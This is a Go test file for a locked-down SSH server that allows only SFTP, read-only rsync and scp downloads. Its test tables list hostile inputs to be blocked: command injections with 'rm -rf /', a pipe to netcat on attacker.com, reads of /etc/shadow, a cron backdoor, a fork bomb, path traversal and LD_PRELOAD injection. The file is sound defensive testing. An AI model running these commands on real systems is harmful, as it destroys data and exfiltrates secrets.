package main

import (
	"regexp"
	"strings"
	"testing"
)

const (
	internalSFTP = "internal-sftp"
)

// TestInteractiveShellBlocking tests that interactive shell access is properly denied
func TestInteractiveShellBlocking(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		shouldAllow bool
	}{
		{
			name:        "empty command (interactive shell)",
			command:     "",
			shouldAllow: false,
		},
		{
			name:        "whitespace only",
			command:     "   ",
			shouldAllow: false,
		},
		{
			name:        "tab only",
			command:     "\t",
			shouldAllow: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.command == "" || strings.TrimSpace(tt.command) == "" {
				// Empty commands should be denied
				if tt.shouldAllow {
					t.Errorf("Empty command should be denied")
				}
			}
		})
	}
}

// TestCommandInjectionAttempts tests various command injection attack vectors
func TestCommandInjectionAttempts(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		shouldAllow bool
		description string
	}{
		// Semicolon injection
		{
			name:        "rsync with semicolon command injection",
			command:     "rsync --server --sender; rm -rf /",
			shouldAllow: false,
			description: "Semicolon command separator should be blocked",
		},
		{
			name:        "scp with semicolon injection",
			command:     "scp -f /file; cat /etc/passwd",
			shouldAllow: false,
			description: "Command chaining via semicolon",
		},

		// Pipe injection
		{
			name:        "rsync with pipe injection",
			command:     "rsync --server --sender | sh",
			shouldAllow: false,
			description: "Pipe to shell should be blocked",
		},
		{
			name:        "scp with pipe to netcat",
			command:     "scp -f /file | nc attacker.com 1234",
			shouldAllow: false,
			description: "Data exfiltration via pipe",
		},

		// Background execution
		{
			name:        "rsync with background execution",
			command:     "rsync --server --sender & /bin/sh",
			shouldAllow: false,
			description: "Background process execution",
		},

		// Command substitution
		{
			name:        "backtick command substitution",
			command:     "rsync --server `whoami` --sender",
			shouldAllow: false,
			description: "Backtick command substitution",
		},
		{
			name:        "dollar paren command substitution",
			command:     "rsync --server $(id) --sender",
			shouldAllow: false,
			description: "$() command substitution",
		},

		// Redirection attacks
		{
			name:        "output redirection to overwrite file",
			command:     "scp -f /file > /etc/passwd",
			shouldAllow: false,
			description: "File overwrite via output redirection",
		},
		{
			name:        "input redirection",
			command:     "rsync --server --sender < /etc/shadow",
			shouldAllow: false,
			description: "Reading sensitive files via input redirection",
		},

		// Newline/carriage return injection
		{
			name:        "newline injection",
			command:     "rsync --server --sender\nrm -rf /",
			shouldAllow: false,
			description: "Newline character injection",
		},
		{
			name:        "carriage return injection",
			command:     "scp -f /file\r\nsh",
			shouldAllow: false,
			description: "CRLF injection",
		},

		// Null byte injection
		{
			name:        "null byte injection",
			command:     "scp -f /file\x00; rm -rf /",
			shouldAllow: false,
			description: "Null byte to terminate parsing",
		},

		// Environment variable injection
		{
			name:        "environment variable expansion",
			command:     "rsync --server $HOME --sender",
			shouldAllow: false,
			description: "Environment variable expansion",
		},

		// Glob pattern injection
		{
			name:        "glob pattern expansion",
			command:     "scp -f /etc/passwd* /tmp/*",
			shouldAllow: false,
			description: "Shell glob expansion attack",
		},

		// Legitimate commands (for comparison)
		{
			name:        "legitimate sftp",
			command:     internalSFTP,
			shouldAllow: true,
			description: "Valid SFTP command",
		},
		{
			name:        "legitimate rsync sender",
			command:     "rsync --server --sender -vlogDtpr . /restores/backup",
			shouldAllow: true,
			description: "Valid rsync read operation",
		},
		{
			name:        "legitimate scp download",
			command:     "scp -f /restores/file.txt",
			shouldAllow: true,
			description: "Valid scp download",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test for dangerous shell metacharacters
			dangerousChars := []string{";", "|", "&", "`", "$", ">", "<", "\n", "\r", "\x00", "*"}
			containsDangerous := false
			for _, char := range dangerousChars {
				if strings.Contains(tt.command, char) {
					containsDangerous = true
					break
				}
			}

			if containsDangerous && tt.shouldAllow {
				t.Errorf("Command with dangerous characters should be blocked: %s", tt.description)
			}

			// Commands with shell metacharacters should be carefully validated
			// The new implementation uses parseCommand() and direct syscall.Exec (no shell)
			// Shell metacharacters are parsed as literal arguments, not interpreted by bash
			// These should be caught at the command validation level (not matching allowed patterns)
		})
	}
}

// TestRsyncSecurityControls tests rsync-specific security controls
func TestRsyncSecurityControls(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		shouldAllow bool
		reason      string
	}{
		// Read-only enforcement
		{
			name:        "rsync sender mode (download)",
			command:     "rsync --server --sender -vlogDtpr . /restores/",
			shouldAllow: true,
			reason:      "Sender mode is read-only and should be allowed",
		},
		{
			name:        "rsync receiver mode (upload)",
			command:     "rsync --server -vlogDtpr . /restores/",
			shouldAllow: false,
			reason:      "Receiver mode without --sender is write and should be blocked",
		},
		{
			name:        "rsync without server flag",
			command:     "rsync /local /remote",
			shouldAllow: false,
			reason:      "Non-server rsync should be blocked",
		},

		// Path traversal attempts in rsync
		{
			name:        "rsync with parent directory traversal",
			command:     "rsync --server --sender . ../../etc/passwd",
			shouldAllow: false,
			reason:      "Path traversal attempt",
		},
		{
			name:        "rsync with absolute path to sensitive file",
			command:     "rsync --server --sender . /etc/shadow",
			shouldAllow: false,
			reason:      "Absolute path to sensitive file",
		},

		// Archive flag concerns (preserves permissions, symlinks)
		{
			name:        "rsync with archive flag",
			command:     "rsync --server --sender -a . /restores/",
			shouldAllow: true,
			reason:      "Archive flag in read mode should be safe",
		},

		// Delete operations
		{
			name:        "rsync with delete flag",
			command:     "rsync --server --sender --delete . /restores/",
			shouldAllow: false,
			reason:      "Delete operations should be blocked even in sender mode",
		},

		// Daemon mode attempts
		{
			name:        "rsync daemon mode",
			command:     "rsync --daemon",
			shouldAllow: false,
			reason:      "Daemon mode should be blocked",
		},

		// Remote shell execution
		{
			name:        "rsync with remote shell",
			command:     "rsync --server --sender -e ssh . /restores/",
			shouldAllow: true,
			reason:      "Remote shell flag shouldn't affect server mode",
		},

		// Numeric owner preservation (UID/GID manipulation)
		{
			name:        "rsync preserving numeric owners",
			command:     "rsync --server --sender --numeric-ids . /restores/",
			shouldAllow: true,
			reason:      "Numeric IDs in read mode should be safe",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isRsync := isRsyncCommand(tt.command)

			if !isRsync && strings.HasPrefix(tt.command, "rsync") {
				t.Logf("Command rejected at isRsyncCommand check: %s", tt.reason)
				if tt.shouldAllow {
					t.Errorf("Valid rsync command rejected: %s", tt.reason)
				}
				return
			}

			if isRsync {
				isSender, _ := regexp.MatchString(`--sender`, tt.command)
				hasDelete, _ := regexp.MatchString(`--delete`, tt.command)

				// Check sender mode
				if !isSender && tt.shouldAllow {
					t.Errorf("Non-sender rsync should be blocked: %s", tt.reason)
				}

				// Check for dangerous delete flag
				if hasDelete {
					t.Logf("Command contains --delete flag, should be blocked: %s", tt.reason)
				}
			}
		})
	}
}

// TestScpSecurityControls tests scp-specific security controls
func TestScpSecurityControls(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		shouldAllow bool
		reason      string
	}{
		// Download vs Upload
		{
			name:        "scp download with -f flag",
			command:     "scp -f /restores/file.txt",
			shouldAllow: true,
			reason:      "Download mode (-f) should be allowed",
		},
		{
			name:        "scp upload with -t flag",
			command:     "scp -t /restores/newfile.txt",
			shouldAllow: false,
			reason:      "Upload mode (-t) should be blocked",
		},
		{
			name:        "scp without mode flag",
			command:     "scp /restores/file.txt",
			shouldAllow: false,
			reason:      "SCP without mode flag should be blocked",
		},

		// Path traversal in scp
		{
			name:        "scp download with parent traversal",
			command:     "scp -f ../../etc/passwd",
			shouldAllow: false,
			reason:      "Path traversal via parent directory",
		},
		{
			name:        "scp with absolute path to sensitive file",
			command:     "scp -f /etc/shadow",
			shouldAllow: false,
			reason:      "Absolute path to sensitive system file",
		},
		{
			name:        "scp with home directory shortcut",
			command:     "scp -f ~/../../etc/passwd",
			shouldAllow: false,
			reason:      "Home directory expansion followed by traversal",
		},

		// Preserve flags (permissions, times)
		{
			name:        "scp with preserve times",
			command:     "scp -f -p /restores/file.txt",
			shouldAllow: true,
			reason:      "Preserve times in download mode is safe",
		},

		// Recursive operations
		{
			name:        "scp recursive download",
			command:     "scp -f -r /restores/directory/",
			shouldAllow: true,
			reason:      "Recursive download should be allowed",
		},
		{
			name:        "scp recursive upload",
			command:     "scp -t -r /restores/directory/",
			shouldAllow: false,
			reason:      "Recursive upload should be blocked",
		},

		// Combined flags
		{
			name:        "scp with combined flags",
			command:     "scp -fprvq /restores/file.txt",
			shouldAllow: true,
			reason:      "Combined flags in download mode",
		},

		// Source routing / port forwarding attempts
		{
			name:        "scp with custom port",
			command:     "scp -f -P 9999 /restores/file.txt",
			shouldAllow: true,
			reason:      "Custom port in download mode",
		},

		// Wildcard injection
		{
			name:        "scp with wildcard in path",
			command:     "scp -f /restores/*.txt",
			shouldAllow: false,
			reason:      "Wildcard expansion could expose unintended files",
		},

		// Long path DoS
		{
			name:        "scp with extremely long path",
			command:     "scp -f " + strings.Repeat("/very/long/path", 1000),
			shouldAllow: false,
			reason:      "Extremely long paths could cause DoS",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isScp := isScpCommand(tt.command)

			if !isScp && strings.HasPrefix(tt.command, "scp") {
				t.Logf("Command rejected at isScpCommand check: %s", tt.reason)
				if tt.shouldAllow {
					t.Errorf("Valid scp command rejected: %s", tt.reason)
				}
				return
			}

			if isScp {
				hasDownload, _ := regexp.MatchString(`-f`, tt.command)
				hasUpload, _ := regexp.MatchString(`-t`, tt.command)

				if hasUpload && tt.shouldAllow {
					t.Errorf("Upload command should be blocked: %s", tt.reason)
				}

				if !hasDownload && !hasUpload && tt.shouldAllow {
					t.Errorf("Command without mode flag should be blocked: %s", tt.reason)
				}
			}
		})
	}
}

// TestPathTraversalAttempts tests various path traversal attack vectors
func TestPathTraversalAttempts(t *testing.T) {
	tests := []struct {
		name        string
		path        string
		shouldAllow bool
		reason      string
	}{
		{
			name:        "relative parent traversal",
			path:        "../../../etc/passwd",
			shouldAllow: false,
			reason:      "Classic path traversal",
		},
		{
			name:        "absolute path to root",
			path:        "/etc/shadow",
			shouldAllow: false,
			reason:      "Absolute path outside chroot",
		},
		{
			name:        "encoded parent traversal",
			path:        "..%2f..%2f..%2fetc%2fpasswd",
			shouldAllow: false,
			reason:      "URL-encoded path traversal",
		},
		{
			name:        "double-encoded traversal",
			path:        "..%252f..%252fetc%252fpasswd",
			shouldAllow: false,
			reason:      "Double URL-encoded",
		},
		{
			name:        "unicode encoding",
			path:        "..\\u002f..\\u002fetc\\u002fpasswd",
			shouldAllow: false,
			reason:      "Unicode-encoded slashes",
		},
		{
			name:        "null byte injection in path",
			path:        "/restores/file.txt\x00/../../../../etc/passwd",
			shouldAllow: false,
			reason:      "Null byte to truncate path validation",
		},
		{
			name:        "path with embedded newline",
			path:        "/restores/\n/../../../../etc/passwd",
			shouldAllow: false,
			reason:      "Newline in path",
		},
		{
			name:        "normal restores path",
			path:        "/restores/backup/file.txt",
			shouldAllow: true,
			reason:      "Normal path within allowed directory",
		},
		{
			name:        "relative safe path",
			path:        "backup/file.txt",
			shouldAllow: true,
			reason:      "Relative path without traversal",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Check for common path traversal patterns
			hasParentRef := strings.Contains(tt.path, "..")
			hasAbsolutePath := strings.HasPrefix(tt.path, "/") && !strings.HasPrefix(tt.path, "/restores")
			hasEncodedSlash := strings.Contains(tt.path, "%2f") || strings.Contains(tt.path, "%2F")
			hasNullByte := strings.Contains(tt.path, "\x00")
			hasNewline := strings.Contains(tt.path, "\n")

			isDangerous := hasParentRef || hasAbsolutePath || hasEncodedSlash || hasNullByte || hasNewline

			if isDangerous && tt.shouldAllow {
				t.Errorf("Dangerous path should be blocked: %s - %s", tt.path, tt.reason)
			}

			if !isDangerous && !tt.shouldAllow {
				t.Logf("Path flagged as safe but marked as dangerous: %s", tt.reason)
			}
		})
	}
}

// TestPrivilegeEscalationAttempts tests attempts to escalate privileges
func TestPrivilegeEscalationAttempts(t *testing.T) {
	tests := []struct {
		name    string
		command string
		reason  string
	}{
		{
			name:    "sudo execution",
			command: "sudo rm -rf /",
			reason:  "Attempting to run commands as root",
		},
		{
			name:    "su to root",
			command: "su - root",
			reason:  "Switching to root user",
		},
		{
			name:    "setuid binary execution",
			command: "/bin/passwd attacker_password",
			reason:  "Executing setuid binary",
		},
		{
			name:    "kernel module loading",
			command: "insmod /tmp/malicious.ko",
			reason:  "Loading kernel module",
		},
		{
			name:    "cron job installation",
			command: "echo '* * * * * /bin/sh' | crontab -",
			reason:  "Installing backdoor cron job",
		},
		{
			name:    "systemctl manipulation",
			command: "systemctl start malicious.service",
			reason:  "Manipulating systemd services",
		},
		{
			name:    "chroot escape attempt",
			command: "chroot /proc/1/root /bin/sh",
			reason:  "Attempting chroot escape",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// None of these commands should match allowed patterns
			isAllowed := tt.command == internalSFTP ||
				isRsyncCommand(tt.command) ||
				isScpCommand(tt.command)

			if isAllowed {
				t.Errorf("Privilege escalation command incorrectly allowed: %s", tt.reason)
			}
		})
	}
}

// TestDenialOfServiceAttempts tests various DoS attack vectors
func TestDenialOfServiceAttempts(t *testing.T) {
	tests := []struct {
		name    string
		command string
		reason  string
	}{
		{
			name:    "fork bomb",
			command: ":(){ :|:& };:",
			reason:  "Bash fork bomb",
		},
		{
			name:    "infinite loop",
			command: "while true; do echo 'attack'; done",
			reason:  "Infinite loop consuming CPU",
		},
		{
			name:    "disk fill",
			command: "dd if=/dev/zero of=/tmp/bigfile bs=1M count=999999",
			reason:  "Filling disk with large file",
		},
		{
			name:    "extremely long command",
			command: "rsync --server --sender " + strings.Repeat("A", 100000),
			reason:  "Extremely long command - now blocked by maxCommandLength (10KB limit)",
		},
		{
			name:    "recursive rsync on large tree",
			command: "rsync --server --sender -r . /",
			reason:  "Recursive operation on entire filesystem",
		},
		{
			name:    "tar bomb extraction",
			command: "tar -xzf /tmp/bomb.tar.gz",
			reason:  "Extracting tar bomb",
		},
		{
			name:    "zip bomb",
			command: "unzip /tmp/42.zip",
			reason:  "Extracting zip bomb",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// These commands should not match any allowed pattern
			isAllowed := tt.command == internalSFTP ||
				isRsyncCommand(tt.command) ||
				isScpCommand(tt.command)

			if isAllowed {
				t.Logf("DoS command matched allowed pattern (needs runtime limits): %s", tt.reason)
			}
		})
	}
}

// TestBinaryPathManipulation tests attempts to manipulate binary paths
func TestBinaryPathManipulation(t *testing.T) {
	tests := []struct {
		name    string
		command string
		reason  string
	}{
		{
			name:    "custom rsync binary",
			command: "/tmp/malicious-rsync --server --sender",
			reason:  "Using custom rsync binary from /tmp",
		},
		{
			name:    "relative path binary",
			command: "./rsync --server --sender",
			reason:  "Using relative path binary",
		},
		{
			name:    "symlink to malicious binary",
			command: "/var/tmp/link-to-shell --server --sender",
			reason:  "Using symlinked binary",
		},
		{
			name:    "PATH manipulation in command",
			command: "PATH=/tmp:$PATH rsync --server --sender",
			reason:  "Manipulating PATH environment variable",
		},
		{
			name:    "LD_PRELOAD injection",
			command: "LD_PRELOAD=/tmp/malicious.so rsync --server --sender",
			reason:  "Library preload attack",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Commands with path manipulation shouldn't match simple patterns
			isRsync := isRsyncCommand(tt.command)

			// Check if command starts with known safe binary names
			startsWithRsync := strings.HasPrefix(tt.command, "rsync ")

			if isRsync && !startsWithRsync {
				t.Logf("Path manipulation detected: %s", tt.reason)
			}
		})
	}
}

// TestFlagInjectionAttempts tests attempts to inject malicious flags
func TestFlagInjectionAttempts(t *testing.T) {
	tests := []struct {
		name    string
		command string
		reason  string
	}{
		{
			name:    "rsync with exclude to hide deletion",
			command: "rsync --server --sender --exclude=/etc --delete-excluded",
			reason:  "Using exclude with delete to hide destructive operations",
		},
		{
			name:    "rsync with custom config file",
			command: "rsync --server --sender --config=/tmp/malicious.conf",
			reason:  "Loading custom rsync configuration",
		},
		{
			name:    "rsync with remote shell",
			command: "rsync --server --sender --rsh='sh -c malicious'",
			reason:  "Injecting remote shell command",
		},
		{
			name:    "scp with ProxyCommand",
			command: "scp -f -o ProxyCommand='sh' /file",
			reason:  "SSH ProxyCommand injection",
		},
		{
			name:    "scp with custom identity file",
			command: "scp -f -i /tmp/malicious_key /file",
			reason:  "Using custom SSH key",
		},
		{
			name:    "rsync with temp dir control",
			command: "rsync --server --sender --temp-dir=/etc",
			reason:  "Controlling temporary directory location",
		},
		{
			name:    "rsync with log file",
			command: "rsync --server --sender --log-file=/etc/cron.d/backdoor",
			reason:  "Writing logs to sensitive location",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Check for dangerous flags (must match implementation in oadp-sshd.go)
			dangerousFlags := []string{
				"--rsh=",        // Custom remote shell (command execution)
				"--config=",     // Load custom rsync config
				"--rsync-path=", // Custom rsync path (command execution)
				"--daemon",      // Daemon mode
				"--delete",      // Delete operations
			}

			hasDangerousFlag := false
			for _, flag := range dangerousFlags {
				if strings.Contains(tt.command, flag) {
					hasDangerousFlag = true
					t.Logf("Dangerous flag detected: %s in %s", flag, tt.reason)
					break
				}
			}

			if !hasDangerousFlag {
				t.Logf("No explicitly dangerous flags detected for: %s", tt.reason)
			}
		})
	}
}

// TestSFTPSecurityControls tests SFTP-specific security
func TestSFTPSecurityControls(t *testing.T) {
	tests := []struct {
		name    string
		command string
		allowed bool
		reason  string
	}{
		{
			name:    "legitimate sftp",
			command: internalSFTP,
			allowed: true,
			reason:  "Standard SFTP subsystem request",
		},
		{
			name:    "sftp with arguments (suspicious)",
			command: internalSFTP + " -d /",
			allowed: false,
			reason:  "SFTP with unexpected arguments",
		},
		{
			name:    "external sftp binary",
			command: "/usr/bin/sftp-server",
			allowed: false,
			reason:  "Using external SFTP binary instead of internal",
		},
		{
			name:    "sftp command injection",
			command: internalSFTP + "; rm -rf /",
			allowed: false,
			reason:  "Command injection after SFTP",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Only exact match should be allowed for SFTP
			isExactMatch := tt.command == internalSFTP

			if isExactMatch != tt.allowed {
				t.Errorf("SFTP validation failed for: %s", tt.reason)
			}
		})
	}
}

// TestRegexSecurityVulnerabilities tests for regex-based vulnerabilities
func TestRegexSecurityVulnerabilities(t *testing.T) {
	tests := []struct {
		name    string
		command string
		reason  string
	}{
		{
			name:    "ReDoS with many spaces",
			command: "rsync" + strings.Repeat(" ", 10000) + "--server",
			reason:  "Potential regex denial of service with excessive spaces",
		},
		{
			name:    "ReDoS with alternating pattern",
			command: "rsync " + strings.Repeat("-x ", 5000) + "--server",
			reason:  "Alternating pattern to slow down regex",
		},
		{
			name:    "Very long flag name",
			command: "rsync --" + strings.Repeat("a", 10000) + " --server",
			reason:  "Extremely long flag name",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test that regex doesn't hang or crash
			// In production, there should be timeouts on regex matching
			isRsync := isRsyncCommand(tt.command)
			t.Logf("Command processed without hang (isRsync=%v): %s", isRsync, tt.reason)
		})
	}
}

// TestEnvironmentVariableManipulation tests environment variable attacks
func TestEnvironmentVariableManipulation(t *testing.T) {
	tests := []struct {
		name   string
		env    map[string]string
		reason string
	}{
		{
			name: "LD_PRELOAD injection",
			env: map[string]string{
				"LD_PRELOAD": "/tmp/malicious.so",
			},
			reason: "Preloading malicious library",
		},
		{
			name: "LD_LIBRARY_PATH manipulation",
			env: map[string]string{
				"LD_LIBRARY_PATH": "/tmp/malicious-libs",
			},
			reason: "Redirecting library loading",
		},
		{
			name: "BASH_ENV injection",
			env: map[string]string{
				"BASH_ENV": "/tmp/malicious-script.sh",
			},
			reason: "Auto-executing script via BASH_ENV",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Environment variables are filtered by filterEnvironment() function
			// The implementation uses syscall.Exec with filtered environment
			// Check that dangerous variables would be filtered
			testEnv := []string{}
			for key, val := range tt.env {
				testEnv = append(testEnv, key+"="+val)
			}

			filtered := filterEnvironment(testEnv)

			// Dangerous env vars should be removed
			for _, filteredVar := range filtered {
				for key := range tt.env {
					if strings.HasPrefix(filteredVar, key+"=") {
						t.Errorf("Dangerous environment variable %s was not filtered: %s", key, tt.reason)
					}
				}
			}
		})
	}
}

// TestParseCommand tests the command argument parser
func TestParseCommand(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []string
		wantErr  bool
	}{
		{
			name:     "simple command",
			input:    "rsync --server --sender",
			expected: []string{"rsync", "--server", "--sender"},
			wantErr:  false,
		},
		{
			name:     "command with flags and path",
			input:    "rsync --server --sender -vlogDtpr . /restores/backup",
			expected: []string{"rsync", "--server", "--sender", "-vlogDtpr", ".", "/restores/backup"},
			wantErr:  false,
		},
		{
			name:     "quoted arguments with spaces",
			input:    `rsync --server "file with spaces.txt"`,
			expected: []string{"rsync", "--server", "file with spaces.txt"},
			wantErr:  false,
		},
		{
			name:     "single quoted arguments",
			input:    `scp -f '/path/with spaces/file.txt'`,
			expected: []string{"scp", "-f", "/path/with spaces/file.txt"},
			wantErr:  false,
		},
		{
			name:     "mixed quotes",
			input:    `rsync --server "path1" 'path2'`,
			expected: []string{"rsync", "--server", "path1", "path2"},
			wantErr:  false,
		},
		{
			name:     "escaped characters in double quotes",
			input:    `rsync --server "file\"name.txt"`,
			expected: []string{"rsync", "--server", `file"name.txt`},
			wantErr:  false,
		},
		{
			name:     "multiple spaces between args",
			input:    "rsync    --server    --sender",
			expected: []string{"rsync", "--server", "--sender"},
			wantErr:  false,
		},
		{
			name:     "tabs between args",
			input:    "rsync\t--server\t--sender",
			expected: []string{"rsync", "--server", "--sender"},
			wantErr:  false,
		},
		{
			name:     "unbalanced double quotes",
			input:    `rsync --server "unclosed`,
			expected: nil,
			wantErr:  true,
		},
		{
			name:     "unbalanced single quotes",
			input:    `rsync --server 'unclosed`,
			expected: nil,
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := parseCommand(tt.input)

			if (err != nil) != tt.wantErr {
				t.Errorf("parseCommand() error = %v, wantErr %v", err, tt.wantErr)
				return
			}

			if err == nil {
				if len(result) != len(tt.expected) {
					t.Errorf("parseCommand() returned %d args, expected %d\nGot: %v\nExpected: %v",
						len(result), len(tt.expected), result, tt.expected)
					return
				}

				for i := range result {
					if result[i] != tt.expected[i] {
						t.Errorf("parseCommand() arg[%d] = %q, expected %q", i, result[i], tt.expected[i])
					}
				}
			}
		})
	}
}

// TestContainsFlag tests the flag detection helper
func TestContainsFlag(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		flag     string
		expected bool
	}{
		{
			name:     "flag present",
			args:     []string{"--server", "--sender", "-v"},
			flag:     "--sender",
			expected: true,
		},
		{
			name:     "flag absent",
			args:     []string{"--server", "-v"},
			flag:     "--sender",
			expected: false,
		},
		{
			name:     "exact match required",
			args:     []string{"--server-mode"},
			flag:     "--server",
			expected: false,
		},
		{
			name:     "short flag present",
			args:     []string{"-f", "-v", "-p"},
			flag:     "-f",
			expected: true,
		},
		{
			name:     "empty args",
			args:     []string{},
			flag:     "--sender",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := containsFlag(tt.args, tt.flag)
			if result != tt.expected {
				t.Errorf("containsFlag(%v, %q) = %v, expected %v",
					tt.args, tt.flag, result, tt.expected)
			}
		})
	}
}

// TestContainsAnyDangerousFlag tests dangerous flag detection
func TestContainsAnyDangerousFlag(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected bool
		reason   string
	}{
		{
			name:     "contains --rsh= flag",
			args:     []string{"--server", "--rsh=/bin/sh"},
			expected: true,
			reason:   "Custom remote shell is dangerous",
		},
		{
			name:     "contains --config= flag",
			args:     []string{"--server", "--config=/tmp/evil.conf"},
			expected: true,
			reason:   "Custom config file is dangerous",
		},
		{
			name:     "contains --rsync-path= flag",
			args:     []string{"--server", "--rsync-path=/tmp/evil"},
			expected: true,
			reason:   "Custom rsync path is dangerous",
		},
		{
			name:     "contains --daemon flag",
			args:     []string{"--daemon", "--server"},
			expected: true,
			reason:   "Daemon mode is dangerous",
		},
		{
			name:     "contains --delete flag",
			args:     []string{"--server", "--sender", "--delete"},
			expected: true,
			reason:   "Delete operations are dangerous",
		},
		{
			name:     "contains --delete-after variant",
			args:     []string{"--server", "--delete-after"},
			expected: true,
			reason:   "Delete variant flags are dangerous",
		},
		{
			name:     "safe flags only",
			args:     []string{"--server", "--sender", "-v", "-l", "-o", "-g"},
			expected: false,
			reason:   "Standard transfer flags are safe",
		},
		{
			name:     "empty args",
			args:     []string{},
			expected: false,
			reason:   "Empty args should be safe",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := containsAnyDangerousFlag(tt.args)
			if result != tt.expected {
				t.Errorf("containsAnyDangerousFlag(%v) = %v, expected %v: %s",
					tt.args, result, tt.expected, tt.reason)
			}
		})
	}
}

// TestFilterEnvironment tests environment variable filtering
func TestFilterEnvironment(t *testing.T) {
	tests := []struct {
		name             string
		input            []string
		shouldContain    []string
		shouldNotContain []string
	}{
		{
			name: "filters LD_PRELOAD",
			input: []string{
				"PATH=/usr/bin",
				"LD_PRELOAD=/tmp/malicious.so",
				"HOME=/home/user",
			},
			shouldContain:    []string{"PATH=/usr/bin", "HOME=/home/user"},
			shouldNotContain: []string{"LD_PRELOAD=/tmp/malicious.so"},
		},
		{
			name: "filters LD_LIBRARY_PATH",
			input: []string{
				"USER=oadp",
				"LD_LIBRARY_PATH=/tmp/evil",
				"LANG=en_US.UTF-8",
			},
			shouldContain:    []string{"USER=oadp", "LANG=en_US.UTF-8"},
			shouldNotContain: []string{"LD_LIBRARY_PATH=/tmp/evil"},
		},
		{
			name: "filters multiple dangerous vars",
			input: []string{
				"SAFE_VAR=value",
				"LD_AUDIT=/tmp/audit.so",
				"BASH_ENV=/tmp/script.sh",
				"ENV=/tmp/env.sh",
				"ANOTHER_SAFE=test",
			},
			shouldContain:    []string{"SAFE_VAR=value", "ANOTHER_SAFE=test"},
			shouldNotContain: []string{"LD_AUDIT=", "BASH_ENV=", "ENV=/tmp"},
		},
		{
			name: "filters all dangerous LD_ variants",
			input: []string{
				"PATH=/bin",
				"LD_PRELOAD=/tmp/a.so",
				"LD_LIBRARY_PATH=/tmp",
				"LD_AUDIT=/tmp/b.so",
				"LD_BIND_NOW=1",
			},
			shouldContain:    []string{"PATH=/bin"},
			shouldNotContain: []string{"LD_PRELOAD=", "LD_LIBRARY_PATH=", "LD_AUDIT=", "LD_BIND_NOW="},
		},
		{
			name: "allows safe variables",
			input: []string{
				"PATH=/usr/bin",
				"HOME=/home/oadp",
				"USER=oadp",
				"LANG=en_US.UTF-8",
				"TERM=xterm",
			},
			shouldContain:    []string{"PATH=", "HOME=", "USER=", "LANG=", "TERM="},
			shouldNotContain: []string{},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := filterEnvironment(tt.input)

			// Check that expected vars are present
			for _, expected := range tt.shouldContain {
				found := false
				for _, actual := range result {
					if actual == expected || strings.HasPrefix(actual, strings.Split(expected, "=")[0]+"=") {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("Expected environment variable %q not found in result", expected)
				}
			}

			// Check that dangerous vars are removed
			for _, forbidden := range tt.shouldNotContain {
				for _, actual := range result {
					if strings.HasPrefix(actual, strings.Split(forbidden, "=")[0]+"=") {
						t.Errorf("Dangerous environment variable %q should have been filtered out", actual)
					}
				}
			}
		})
	}
}

// Benchmark tests for performance and DoS resistance
func BenchmarkIsRsyncCommand(b *testing.B) {
	testCommands := []string{
		"rsync --server --sender -vlogDtpr . /restores/",
		"scp -f /file",
		"not-rsync --server",
		"rsync" + strings.Repeat(" ", 100) + "--server",
	}

	for i := 0; i < b.N; i++ {
		for _, cmd := range testCommands {
			isRsyncCommand(cmd)
		}
	}
}

func BenchmarkIsScpCommand(b *testing.B) {
	testCommands := []string{
		"scp -f /file",
		"rsync --server",
		"scp -t /upload",
		"not-scp",
	}

	for i := 0; i < b.N; i++ {
		for _, cmd := range testCommands {
			isScpCommand(cmd)
		}
	}
}
